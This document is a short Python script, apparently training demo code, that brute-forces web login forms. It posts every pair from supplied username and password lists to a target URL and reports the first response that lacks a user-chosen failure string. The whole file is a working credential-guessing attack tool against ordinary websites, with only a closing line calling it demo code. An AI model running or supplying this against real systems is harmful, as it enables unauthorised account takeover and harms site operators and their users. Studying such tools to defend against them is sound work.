import sys, os, requests, argparse

usernames = []
passwords = []
url = ""

def loadfiles(filename):
    data = []
    with open(filename,'r') as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def bruteforce(url, failcheck):
    for username in usernames:
        for password in passwords:
            payload = {
                'username':username,
                'password':password
            }
            response = requests.post(url, data = payload)

            if failcheck in response.text:
                pass
            else:
                return payload

def main(url, failflag):
    results = bruteforce(url, failflag)

    if results != None:
        print("[+] Login Found! {0}".format(results))
    else:
        print("[-] No Login Match")

if __name__ == "__main__":
    usage = "{0} [-h] [-u string] [-U FILE] [-p string] [-P FILE] SITEURL".format(os.path.basename(__file__))

    parser = argparse.ArgumentParser(
        description="Brute force form post",
        usage=usage
    )

    parser.add_argument("siteurl", metavar="SITEURL", help="Website url")
    group = parser.add_argument_group('options')
    group.add_argument("-u", "--username", type=str, help="the username you want to use")
    group.add_argument("-U", "--usernames", type=str, help="the username file you want to use")
    group.add_argument("-p", "--password", type=str, help="the password you want to use")
    group.add_argument("-P", "--passwords", type=str, help="the password file you want to use")
    group.add_argument("-f", "--failflag", type=str, help="text to use to determine failure")

    args = parser.parse_args()

    if (args.username != None and args.usernames != None):
        print("You can only use one of the username methods.")
        sys.exit(1)

    if (args.password != None and args.passwords != None):
        print("You can only use one of the password methods.")
        sys.exit(1)

    if (args.failflag == None):
        print("You have to set fail flag.")
        sys.exit(1)

    if args.usernames:
        usernames += (loadfiles(args.usernames))
    elif args.username:
        usernames.append(args.username)
    else:
        print("You have to use one of the password methods.")
        sys.exit(1)

    if args.passwords:
        passwords += (loadfiles(args.passwords))
    elif args.password:
        passwords.append(args.password)
    else:
        print("You have to use one of the password methods.")
        sys.exit(1)
   
    main(args.siteurl, args.failflag)

    print('This is a demo code used for this training.')